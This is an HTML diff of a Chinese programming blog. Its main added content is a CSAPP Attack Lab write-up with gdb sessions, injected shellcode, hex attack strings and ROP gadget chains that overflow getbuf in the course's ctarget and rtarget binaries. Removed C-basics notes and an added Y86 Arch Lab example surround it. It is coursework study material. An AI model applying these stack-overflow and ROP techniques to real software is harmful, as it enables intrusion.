+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) break getbuf</span><br><span class="line">(gdb) run -q</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dca0</span></span><br><span class="line">(gdb) stepi</span><br><span class="line">14	in buf.c</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261054068.png" alt="image-20211126105412037"></p>
+<p>touch2需要接受一个参数，这个参数需要与cookie值相同，函数的第一个参数通过寄存器%rdi传递，同时设置完参数后需要将控制流转移到touch2，查看touch2的开始地址。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271902954.png" alt="image-20211127190235909"></p>
+<p>因此汇编代码，将touch2的地址压入栈顶，ret会弹出栈顶元素作为返回地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq  $0x59b997fa, %rdi		</span><br><span class="line">pushq $0x4017ec                </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>对汇编代码汇编生成目标文件，对目标代码反汇编，得到指令序列的字节表示</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c level2.s</span><br><span class="line">objdump -d level2.o &gt; level2.d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271908668.png" alt="image-20211127190828639"></p>
+<p>得到攻击字符串的字节序列：</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">48 </span>c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span> ec <span class="number">17</span>     </span><br><span class="line"><span class="symbol">40 </span><span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">78 </span>dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>			/* 栈顶地址<span class="number">0</span>x5561dc78 */</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/hex2raw &lt; solution2.txt | ./</span>ctarget -q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271911851.png" alt="image-20211127191142818"></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>touch3函数接受一个指向字符数组首地址的指针作为参数</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271958123.png" alt="image-20211127195837095"></p>
+<p>hexmatch接受cookie和字符数组作为参数，将cookie转化为字符串“59b997fa”，字符串的最后会有一个空字符&#x2F;0作为结束符，十六进制表示为00，strncmp函数比较了9个字符，因此在字符数组后面跟上结束符00</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272002553.png" alt="image-20211127200218526"></p>
+<p>查看getbuf，在函数返回前会修改栈顶的位置，释放占用的栈空间，而此时通过转移程序控制流执行touch3函数，调用hexmatch时会在栈上分配空间，因此touch3的参数指向的字符数组位置不能放在getbuf申请的占空间上。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272003989.png" alt="image-20211126104154718"></p>
+<p>test的栈空间之后不会用到，因此将cookie的字符数组表示放在test的栈空间中。cookie为0x59b997fa，表示为十六进制为35 39 62 39 39 37 66 61 00，栈空间组织如下。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272046849.png" alt="image-20211127204653792"></p>
+<p>getbuf栈空间应该执行的汇编代码：将字符数组的首地址通过%rdi寄存器传递给函数touch3，同时设置返回地址为touch3的首地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi     </span><br><span class="line">pushq $0x4018fa            </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>生成指令字节序列</p>
+<blockquote>
+<p>gcc -c level3.s     将汇编代码变成机器代码</p>
+<p>objdump -d level3.o &gt;level3.d  将机器代码反编译成汇编代码</p>
 </blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>], b[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">10</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(b) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(c) / <span class="keyword">sizeof</span>(<span class="type">int</span>); ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272051563.png" alt="image-20211127205117537"></p>
+<p>对应攻击字符串的字节序列</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> </span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             </span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210411175728807.png" alt="image-20210411175728807"></p>
-<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><h2 id="1-赋值表达式"><a href="#1-赋值表达式" class="headerlink" title="1. 赋值表达式"></a>1. 赋值表达式</h2><p>结果输出10</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    c = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a = b = c);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>验证</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/hex2raw &lt; solution3.txt | ./</span>ctarget -q</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272054939.png" alt="image-20211127205424905"></p>
+<h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>在rtarget中，采用了两种方法来对抗栈溢出攻击：</p>
+<ul>
+<li><p>栈随机化</p>
+<p>设置断点，运行两次查看%rsp栈顶的值，发现其值发生变化。这意味着无法知道getbuf申请栈空间后的栈顶值，从而无法将我们的可执行代码的字节序列以字符串的形式插入到相应的位置。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281920181.png" alt="image-20211128192038064"></p>
+</li>
+<li><p>限制可执行代码区域，栈为不可执行区域</p>
+</li>
+</ul>
+<p>rtarget中没有进行栈破坏检测，因此可以通过破话test的栈帧来达到幸运的目的。</p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>touch2接受一个参数，需要通过寄存器%rdi来传递，因此可以先把cookie值存放在栈中，通过popq指令获得这个值。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281931624.png" alt="image-20211128193143591"></p>
+<p>根据提示，在start_farm和end_farm中查找满足要求的指令编码：</p>
+<p>指令编码需要满足一定要求，nop的指令编码为0x90，ret的指令编码为0xc3，我们通过popq指令或许栈顶的值后，不能有其他的无效指令或者别的指令对结果造成影响。</p>
+<p>因此，如果指令为popq %rax，可以寻找的指令编码为 58 （90） c3，可以找到两处符合要求的。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281943601.png" alt="image-20211128194353528"></p>
+<p>最后的结果时可以找到popq %rdi，直接将想应的值送到%rdi寄存器，查找5f (90) c3，没有找到符合的结果，因此只能先将cookie值传递到一个中间寄存器，在传递到%rdi寄存器中。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281946805.png" alt="image-20211128194608732"></p>
+<p>这一题只需要用到start_farm到mid_farm中的指令编码，通过查找，找到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019cc       58 		popq %rax</span><br><span class="line">               90		nop</span><br><span class="line">               c3		ret</span><br></pre></td></tr></table></figure>
+
+<p>这样的话，通过查看movq指令的编码，需要查找的指令编码为48 89 c7 (90) c3</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281950804.png" alt="image-20211128195027771"></p>
+<p>这里可以找到两个符合要求的结果：</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281952447.png" alt="image-20211128195203377"></p>
+<p>使用的指令编码为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019a2	48 89 c7	movq %rax, %rdi</span><br><span class="line">			c3			ret</span><br></pre></td></tr></table></figure>
+
+<p>因此栈可以组织如下：</p>
+<p>当getbuf函数返回时，返回地址为0x4019cc，同时栈顶为红色位置。</p>
+<p>在0x4019cc，执行popq %rax操作，此时栈顶指向的值为0x4019a2，执行ret指令，将这个值作为返回地址。</p>
+<p>执行完0x4019a2处的指令后，将0x4017ec作为返回地址，执行touch2。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282010992.png" alt="image-20211128201044882"></p>
+<p>对应攻击字符串的字节序列：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">cc</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* popq %rax */</span><br><span class="line"><span class="attribute">fa</span> <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* cookie    */</span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ec</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282016927.png" alt="image-20211128201617892"></p>
+<h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>同代码注入攻击的level3，需要将cookie的字符串十六进制表示存储在某一位置，这一位置不能在getbuf栈帧中，因此需要在test栈帧中。其表示需要占用9个字节，可以考虑放在最近的位置，也就是返回地址的上面，返回地址是我们第一个可以操作的地方，这是要得到%rsp，即cookie字符串首地址的值。movq %rsp, D的指令编码为48 89 eX(X不确定)，查找：</p>
+<p>可以查找到相关指令编码，这时栈顶指向字符串的首地址，而字符串占了两个8字节，后面需要跟两个pop指令让栈顶指向后面的位置，在后面的位置我们可以操作填上其他的地址，以供ret指令返回到相应的位置，但查找不到想应的指令序列。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282027821.png" alt="image-20211128202754741"></p>
+<p>不能通过栈顶地址确定cookie字符串的地址，则cookie可以放在之后的位置，通过首地址+偏移量来确定其位置，但此时依旧需要先确定栈顶位置，并保存其值，因此先查找48 89 eX，看可以使用的指令编码：</p>
+<p>找到的序列只有48 89 e0 c3可以满足要求，对应指令movq %rsp, %rax。现在看通过%rax可以将值传递到哪个寄存器，查找48 49 cX：</p>
+<p>只能找到48 89 c7，可以实现%rax -&gt; %rdi，当前无法向下继续进行，查看另外两个指令编码。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282051440.png" alt="image-20211128205105364"></p>
+<p>根据实验提供的相应andb、orb、cmpb、testb指令可以指导出现这样的两个字节指令编码时不影响相关寄存器的值，因此存在于我们想要的指令后面。观察相应指令特征，来进行查找：</p>
+<p>对于movl类指令查找：</p>
+<table>
+<thead>
+<tr>
+<th>movl</th>
+<th>andb、orb、cmpb、testb</th>
+<th>ret</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>89 ( )</td>
+<td>(20、08、38、84)  (c0、c9、d2、db)</td>
+<td>c3</td>
+</tr>
+</tbody></table>
+<p>其中90也是不影响结果的，可以出现在相应中间位置。查找到的相关指令，可以看出可以实现%eax -&gt; %edx -&gt; %esi的传递。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282043655.png" alt="image-20211128204306609"></p>
+<p>同时之前level2可以找到popq %rax指令，因此可以将偏移量存放在栈中，通过pop指令来进行传递给%esi。然后可以基址+偏移量来确定地址。</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282055203.png" alt="image-20211128205504176"></p>
+<p>现在还无法确定偏移量的值应该为多少，先通过之前的分析，确定程序的控制流：</p>
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282116865.png" alt="image-20211128211625690"></p>
+<p>可以确定偏移量为72&#x3D;0x48</p>
+<p>对应攻击字符串的字节序列：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ab</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">42</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">69</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">27</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">d6</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282118763.png" alt="image-20211128211834719"></p>
 
       
     </div>
@@ -517,7 +670,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">
+    <link itemprop="mainEntityOfPage" href="https://destiny0118.github.io/2023/06/16/Lab%20Project/CSAPP%20Arch%20Lab/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -535,7 +688,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/02/28/%E8%AF%AD%E6%B3%95/C++/C%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">C常用函数</a>
+          <a href="/2023/06/16/Lab%20Project/CSAPP%20Arch%20Lab/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -546,23 +699,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-28 20:24:17" itemprop="dateCreated datePublished" datetime="2023-02-28T20:24:17+08:00">2023-02-28</time>
+      <time title="创建时间：2023-06-16 10:34:21" itemprop="dateCreated datePublished" datetime="2023-06-16T10:34:21+08:00">2023-06-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-09-20 10:28:28" itemprop="dateModified" datetime="2023-09-20T10:28:28+08:00">2023-09-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/grammar/" itemprop="url" rel="index"><span itemprop="name">语法</span></a>
-        </span>
+      <time title="修改时间：2024-03-01 16:42:25" itemprop="dateModified" datetime="2024-03-01T16:42:25+08:00">2024-03-01</time>
     </span>
 
   
@@ -575,36 +719,54 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="1-sizeof"><a href="#1-sizeof" class="headerlink" title="1. sizeof"></a>1. sizeof</h1><blockquote>
-<p>sizeof返回占用的字节数，但数组作为参数传递时不能有效计算占用的字节数，需加参数指明占用的字节数</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len: %d\n&quot;</span>, len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(a));</span><br><span class="line">    sum(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <h1 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022026699.png" alt="image-20211130101913363"></p>
+<p>需要先安装flex、bison，直接安装就好。</p>
+<p>安装tcl&#x2F;tk</p>
+<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">sudo apt install tcl tcl-<span class="built_in">dev</span> tk tk-<span class="built_in">dev</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210406120005828.png" alt="image-20210406120005828"></p>
-<h1 id="2-malloc-realloc"><a href="#2-malloc-realloc" class="headerlink" title="2. malloc realloc"></a>2. malloc realloc</h1><blockquote>
-<p>头文件： stdlib.h</p>
-</blockquote>
-<p><a href="https://blog.csdn.net/qq_38810767/article/details/85265541">malloc&#x2F;calloc&#x2F;realloc之间区别详述</a></p>
-<blockquote>
-<p>realloc后，申请空间比原来大，重新分配地址空间</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> *a = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, a, a[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *b = (<span class="type">int</span> *)<span class="built_in">realloc</span>(a, <span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, b, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *c = (<span class="type">int</span> *)<span class="built_in">realloc</span>(b, <span class="number">5</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, c, c[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要修改相应makefile文件，不需要GUI界面的话第一个就注释掉，第二个需要修改路径。通过命令行直接安装的话时8.6版本，而原来的路径为8.5的，会出现找到到相应文件的问题。后面相应实验出现问题都要修改相应的makefile文件。</p>
+<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112022108921.png" alt="image-20211202210850852"></p>
+<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="sum-ys-迭代求和"><a href="#sum-ys-迭代求和" class="headerlink" title="sum.ys 迭代求和"></a>sum.ys 迭代求和</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list </span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">	.quad 0x00a </span><br><span class="line">	.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">	.quad 0x0b0 </span><br><span class="line">	.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">	.quad 0xc00 </span><br><span class="line">	.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq ele1, %rdi</span><br><span class="line">	call sum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">	xorq %rax, %rax     #sum=0</span><br><span class="line">	andq %rdi, %rdi	    #set CC, test is pointer=0</span><br><span class="line">	jmp test</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi), %r9	    #element value</span><br><span class="line">	addq %r9, %rax</span><br><span class="line">	mrmovq 8(%rdi), %rdi</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">test:</span><br><span class="line">	jne loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210409110803688.png" alt="image-20210409110803688"></p>
-<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/image-20210427184809807.png" alt="image-20210427184809807"></p>
-<h1 id="3-memset"><a href="#3-memset" class="headerlink" title="3. memset"></a>3. memset</h1><blockquote>
